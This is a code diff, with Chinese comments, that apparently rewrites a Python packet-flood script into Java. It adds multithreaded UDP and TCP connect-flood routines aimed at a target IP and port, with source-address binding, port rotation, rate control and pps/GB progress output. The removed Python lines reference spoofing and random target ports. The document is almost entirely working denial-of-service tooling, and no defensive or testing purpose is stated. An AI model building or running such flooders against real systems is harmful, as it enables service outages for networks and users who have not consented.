+                    long dBytes = bytesSent - lastReportedBytes;
+                    long dDropped = dropped - lastReportedDropped;
+                    if (dSent > 0) totalSent.add(dSent);
+                    if (dBytes > 0) totalBytes.add(dBytes);
+                    if (dDropped > 0) totalDropped.add(dDropped);
 
-                if not random_target_port and not use_spoof:
-                    target_port += 1
-                    if target_port > 65534:
-                        target_port = 1
+                } catch (Exception e) {
+                    errOther.increment();
+                    recordError(tag + " 致命错误: " + e.getClass().getSimpleName()
+                            + " (" + e.getMessage() + ")");
+                } finally {
+                    if (channel != null) {
+                        try { channel.close(); } catch (IOException ignored) { }
+                    }
+                }
+            };
+            futures.add(executor.submit(task));
+        }
 
-            except OSError as e:
-                print(f"[!] 发送错误: {e}")
+        waitWithProgress(executor, futures);
+    }
 
-            if sent_bytes >= next_mb:
-                elapsed = time.time() - start_time
-                pps = sent / elapsed if elapsed > 0 else 0
-                mb = sent_bytes / (1024 * 1024)
-                print(f"[>] 已发送: {sent} 包 ({mb:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
-                next_mb += 1024 * 1024
+    // ===================================================================
+    // TCP 攻击（connect 洪泛；不是 SYN 洪泛）—— 已修复：精确包数
+    // ===================================================================
+    private static void startTcpAttack() throws Exception {
+        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
+        List<Future<?>> futures = new ArrayList<>();
+        long packetsPerThread = totalPackets / numThreads;
+        long extra = totalPackets % numThreads;
 
-            if rate_limit > 0:
-                time.sleep(rate_limit)
+        final int connectTimeoutMs = 1000;
+        final int socketTimeoutMs = 500;
 
-    except KeyboardInterrupt:
-        print("\n[!] 用户手动停止")
-    except Exception as e:
-        print(f"\n[!] 错误: {e}")
-    finally:
-        sock.close()
-        elapsed = time.time() - start_time
-        print(f"\n[>] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024):.2f} MB, 用时: {elapsed:.2f} 秒")
+        for (int i = 0; i < numThreads; i++) {
+            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
+            int threadId = i;
+            Runnable task = () -> {
+                String tag = "T" + threadId;
+                InetAddress bindAddr = null;
+                if (bindLocal && !localAddresses.isEmpty()) {
+                    bindAddr = localAddresses.get(threadId % localAddresses.size());
+                }
 
+                // 累计计数器，永不清零
+                long sent = 0, bytesSent = 0, dropped = 0;
+                long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
+                int consecutiveFailures = 0;
+                byte[] payload = new byte[Math.min(64, packetSize)];
+                new Random().nextBytes(payload);
 
-if __name__ == "__main__":
-    main()
+                TokenBucket bucket = null;
+                if (rateLimit > 0) {
+                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
+                }
+
+                while (!stopFlag && sent < pktCount) {
+                    int toSend = (int) Math.min(burstSize, pktCount - sent);
+
+                    if (bucket != null) {
+                        long waitNs = bucket.nanosToWait(toSend);
+                        if (waitNs > 0) {
+                            try { TimeUnit.NANOSECONDS.sleep(waitNs); } catch (InterruptedException ignored) {}
+                        }
+                    }
+
+                    for (int j = 0; j < toSend; j++) {
+                        if (stopFlag || sent >= pktCount) break;
+
+                        try (Socket s = new Socket()) {
+                            if (bindAddr != null) s.bind(new InetSocketAddress(bindAddr, 0));
+                            s.setSoTimeout(socketTimeoutMs);
+                            s.connect(new InetSocketAddress(targetIP, targetPort), connectTimeoutMs);
+                            OutputStream os = s.getOutputStream();
+                            os.write(payload);
+                            os.flush();
+                            sent++;
+                            bytesSent += payload.length;
+                            consecutiveFailures = 0;
+                        } catch (PortUnreachableException e) {
+                            errPortUnreachable.increment();
+                            dropped++;
+                            consecutiveFailures++;
+                        } catch (IOException e) {
+                            errIOException.increment();
+                            dropped++;
+                            consecutiveFailures++;
+                        }
+
+                        if (consecutiveFailures >= 3) {
+                            long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
+                            try { Thread.sleep(backoffMs); } catch (InterruptedException ignored) {}
+                            if (consecutiveFailures > 6) {
+                                recordError(tag + ": 连续失败过多，退避 " + backoffMs + "ms");
+                            }
+                        }
+                    }
+
+                    // 增量刷新
+                    long dSent = sent - lastReportedSent;
+                    long dBytes = bytesSent - lastReportedBytes;
+                    long dDropped = dropped - lastReportedDropped;
+                    if (dSent > 0) totalSent.add(dSent);
+                    if (dBytes > 0) totalBytes.add(dBytes);
+                    if (dDropped > 0) totalDropped.add(dDropped);
+                    lastReportedSent = sent;
+                    lastReportedBytes = bytesSent;
+                    lastReportedDropped = dropped;
+                }
+
+                // 最终刷新
+                long dSent = sent - lastReportedSent;
+                long dBytes = bytesSent - lastReportedBytes;
+                long dDropped = dropped - lastReportedDropped;
+                if (dSent > 0) totalSent.add(dSent);
+                if (dBytes > 0) totalBytes.add(dBytes);
+                if (dDropped > 0) totalDropped.add(dDropped);
+            };
+            futures.add(executor.submit(task));
+        }
+
+        waitWithProgress(executor, futures);
+    }
+
+    // ===================================================================
+    // 进度监控 + 优雅关闭
+    // ===================================================================
+    private static void waitWithProgress(ExecutorService executor, List<Future<?>> futures) throws Exception {
+        long start = System.currentTimeMillis();
+        long lastReportTime = start;
+        long lastReportSent = 0;
+
+        while (!stopFlag) {
+            long now = System.currentTimeMillis();
+            long elapsed = now - start;
+            long sent = totalSent.longValue();
+            long bytes = totalBytes.longValue();
+            long dropped = totalDropped.longValue();
+
+            if (sent >= totalPackets) break;
+            if (duration > 0 && elapsed / 1000 >= duration) {
+                stopFlag = true;
+                break;
+            }
+
+            if (now - lastReportTime >= 1000) {
+                long deltaSent = sent - lastReportSent;
+                double deltaTime = (now - lastReportTime) / 1000.0;
+                double instantRate = deltaSent / deltaTime;
+                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
+                double dataGB = bytes / (1024.0 * 1024 * 1024);
+                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d  err_suppressed=%d%n",
+                        sent, dataGB, rate, instantRate, dropped, errorLimiter.suppressed());
+                if (logWriter != null) {
+                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
+                            sent, dataGB, rate, dropped);
+                    logWriter.flush();
+                }
+                lastReportTime = now;
+                lastReportSent = sent;
+            }
+
+            Thread.sleep(100);
+        }
+
+        stopFlag = true;
+        for (Future<?> f : futures) {
+            try { f.get(); } catch (Exception ignored) { }
+        }
+
+        executor.shutdown();
+        try {
+            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
+                executor.shutdownNow();
+            }
+        } catch (InterruptedException e) {
+            executor.shutdownNow();
+        }
+    }
+
+    // ===================================================================
+    // UDP 带重试发送
+    // ===================================================================
+    private static boolean sendUdpWithRetry(DatagramChannel channel, ByteBuffer buf,
+                                            SocketAddress target, String tag) {
+        int attempts = 0;
+        while (attempts < maxRetries) {
+            try {
+                buf.clear();
+                int written = channel.send(buf, target);
+                if (written > 0) return true;
+            } catch (PortUnreachableException e) {
+                errPortUnreachable.increment();
+                recordError(tag + ": 端口不可达 (" + target + ")");
+            } catch (IOException e) {
+                errIOException.increment();
+                recordError(tag + ": IOException (" + e.getMessage() + ")");
+            } catch (Exception e) {
+                errOther.increment();
+                recordError(tag + ": " + e.getClass().getSimpleName() + " (" + e.getMessage() + ")");
+            }
+            attempts++;
+        }
+        return false;
+    }
+
+    // ===================================================================
+    // UDP 通道工厂
+    // ===================================================================
+    private static DatagramChannel openUdpChannelForThread(int threadId) throws IOException {
+        DatagramChannel channel = DatagramChannel.open();
+        channel.configureBlocking(true);
+
+        DatagramSocket socket = channel.socket();
+        try {
+            socket.setReuseAddress(true);
+            try {
+                socket.setSendBufferSize(4 * 1024 * 1024);
+            } catch (SocketException ignored) { }
+        } catch (SocketException ignored) { }
+
+        InetAddress bindAddr = null;
+        int bindPort = 0;
+
+        if (bindLocal && !localAddresses.isEmpty()) {
+            bindAddr = localAddresses.get(threadId % localAddresses.size());
+        }
+        if (srcPortBase >= 0) {
+            bindPort = srcPortBase + threadId;
+        }
+
+        if (bindAddr != null || bindPort > 0) {
+            try {
+                socket.bind(new InetSocketAddress(
+                        bindAddr != null ? bindAddr : InetAddress.getByName("0.0.0.0"),
+                        bindPort));
+            } catch (BindException e) {
+                errBind.increment();
+                recordError("T" + threadId + ": bind 失败 ("
+                        + (bindAddr != null ? bindAddr : "0.0.0.0") + ":" + bindPort
+                        + ")，改用系统分配端口");
+            }
+        }
+
+        return channel;
+    }
+}
